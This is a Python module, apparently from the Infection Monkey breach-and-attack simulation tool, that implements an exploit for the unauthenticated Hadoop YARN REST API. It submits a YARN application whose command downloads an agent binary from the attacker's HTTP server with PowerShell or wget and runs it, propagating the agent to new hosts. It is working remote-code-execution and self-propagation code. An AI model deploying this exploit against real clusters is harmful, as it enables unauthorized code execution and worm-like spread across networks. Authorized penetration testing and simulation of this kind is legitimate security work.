import json
import logging
import posixpath
import string
from time import time
from typing import Callable, Optional, Sequence, Tuple
from uuid import UUID

import requests

from common import OperatingSystem
from common.agent_events import ExploitationEvent, PropagationEvent
from common.event_queue import IAgentEventPublisher
from common.tags import (
    T1105_ATTACK_TECHNIQUE_TAG,
    T1203_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
)
from common.types import Event
from common.utils.code_utils import insecure_generate_random_string
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.tools.web_tools import build_urls
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import MONKEY_ARG, TargetHost
from infection_monkey.transport import LockedHTTPServer
from infection_monkey.utils.commands import build_monkey_commandline

from .hadoop_options import HadoopOptions

logger = logging.getLogger(__name__)
HADOOP_EXPLOITER_TAG = "hadoop-exploiter"

AgentBinaryServerFactory = Callable[
    [TargetHost, IAgentBinaryRepository], Tuple[Optional[str], Optional[LockedHTTPServer]]
]


HADOOP_WINDOWS_COMMAND_TEMPLATE = (
    "powershell -NoLogo -Command \"if (!(Test-Path '%(monkey_path)s')) { "
    "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing }; "
    " if (! (ps | ? {$_.path -eq '%(monkey_path)s'})) "
    '{& %(monkey_path)s %(monkey_type)s %(parameters)s }  "'
)
# The hadoop server may request another monkey executable after the attacker's HTTP server has shut
# down. This will result in wget creating a zero-length file, which needs to be removed. Using the
# `--no-clobber` option prevents two simultaneously running wget commands from interfering with
# eachother (one will fail and the other will succeed).
#
# If wget creates a zero-length file (because it was unable to contact the attacker's HTTP server),
# it needs to remove the file. It sleeps to minimize the risk that the file was created by another
# concurrently running wget and then removes the file if it is still zero-length after the sleep.
#
# This doesn't eleminate all race conditions, but should be good enough (in the short term) for all
# practical purposes. In the future, using randomized names for the monkey binary (which is a good
# practice anyway) would eleminate most of these issues.
HADOOP_LINUX_COMMAND_TEMPLATE = (
    "wget --no-clobber -O %(monkey_path)s %(http_path)s "
    "|| sleep 5 && ( ( ! [ -s %(monkey_path)s ] ) && rm %(monkey_path)s ) "
    "; chmod +x %(monkey_path)s "
    "&&  %(monkey_path)s %(monkey_type)s %(parameters)s"
)


class Hadoop:
    _EXPLOITED_SERVICE = "Hadoop"
    NAME = "HadoopExploiter"
    # Random string's length that's used for creating unique app name
    RAN_STR_LEN = 6

    _EXPLOITER_TAGS = (HADOOP_EXPLOITER_TAG, T1203_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG)
    _PROPAGATION_TAGS = (HADOOP_EXPLOITER_TAG, T1105_ATTACK_TECHNIQUE_TAG)

    def __init__(
        self,
        host: TargetHost,
        options: HadoopOptions,
        interrupt: Event,
        agent_id: UUID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
        servers: Sequence[str],
        current_depth: int,
    ):
        self._host = host
        self._options = options
        self._interrupt = interrupt
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher
        self._agent_binary_repository = agent_binary_repository
        self.servers = servers
        self.current_depth = current_depth

    def exploit_host(self):
        try:
            # Try to get potential urls
            potential_urls = build_urls(
                str(self._host.ip), [(str(p), False) for p in self._options.target_ports]
            )
            return self.exploit_urls(potential_urls, HTTPTools.create_locked_transfer)
        except Exception as e:
            logger.error("Exception in run", exc_info=True)
            raise e

    def exploit_urls(
        self,
        urls: Sequence[str],
        create_agent_binary_server: AgentBinaryServerFactory,
    ):
        """
        Attempt to exploit on all URLs
        """
        exploit_result = ExploiterResultData(os=self._host.operating_system)

        if not urls:
            exploit_result.error_message = (
                f"No potential exploitable urls has been found for {self._host}"
            )
            return exploit_result

        http_path, http_thread = create_agent_binary_server(
            self._host, self._agent_binary_repository
        )
        if http_thread is None:
            return exploit_result

        command = self._build_command(http_path)
        try:
            for url in urls:
                if self.exploit(url, command):
                    exploit_result.exploitation_success = True
                    exploit_result.propagation_success = True
                    break
        finally:
            if exploit_result.exploitation_success:
                http_thread.join(self._options.agent_binary_download_timeout)
            http_thread.stop()

        return exploit_result

    def _build_command(self, http_path):
        # Build command to execute
        monkey_cmd = build_monkey_commandline(self.servers, self.current_depth + 1)
        if OperatingSystem.WINDOWS == self._host.operating_system:
            base_command = HADOOP_WINDOWS_COMMAND_TEMPLATE
        else:
            base_command = HADOOP_LINUX_COMMAND_TEMPLATE

        return base_command % {
            "monkey_path": get_agent_dst_path(self._host),
            "http_path": http_path,
            "monkey_type": MONKEY_ARG,
            "parameters": monkey_cmd,
        }

    def exploit(self, url: str, command: str) -> bool:
        """
        A reference to a method which implements web exploit logic.

        :param url: Url to send malicious packet to. Format: [http/https]://ip:port/extension.
        :param command: Command which will be executed on remote host
        :return: RCE's output/True if successful or False if failed
        """
        if self._interrupt.is_set():
            return False

        try:
            # Get the newly created application id
            timestamp = time()
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/new-application"),
                timeout=self._options.request_timeout,
            )
            resp_dict = json.loads(resp.content)
            app_id = resp_dict["application-id"]

            # Create a random name for our application in YARN
            # Avoid the risk of blocking by using insecure_generate_random_string()
            rand_name = self._options.yarn_application_suffix + insecure_generate_random_string(
                n=self.RAN_STR_LEN, character_set=string.ascii_lowercase
            )
            payload = Hadoop._build_payload(app_id, rand_name, command)

            if self._interrupt.is_set():
                return False

            timestamp = time()
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/"),
                json=payload,
                timeout=self._options.request_timeout,
            )

            success = resp.status_code == 202
        except requests.ConnectionError:
            success = False

        message = "" if success else f"Failed to exploit via {url}"
        self._publish_exploitation_event(timestamp, success, error_message=message)
        self._publish_propagation_event(timestamp, success, error_message=message)
        return success

    @staticmethod
    def _build_payload(app_id, name, command):
        payload = {
            "application-id": app_id,
            "application-name": name,
            "am-container-spec": {
                "commands": {
                    "command": command,
                }
            },
            "application-type": "YARN",
        }
        return payload

    def _publish_exploitation_event(
        self,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        exploitation_event = ExploitationEvent(
            source=self._agent_id,
            target=self._host.ip,
            success=success,
            exploiter_name=self.NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or self._EXPLOITER_TAGS),
        )
        self._agent_event_publisher.publish(exploitation_event)

    def _publish_propagation_event(
        self,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        propagation_event = PropagationEvent(
            source=self._agent_id,
            target=self._host.ip,
            success=success,
            exploiter_name=self.NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or self._PROPAGATION_TAGS),
        )
        self._agent_event_publisher.publish(propagation_event)
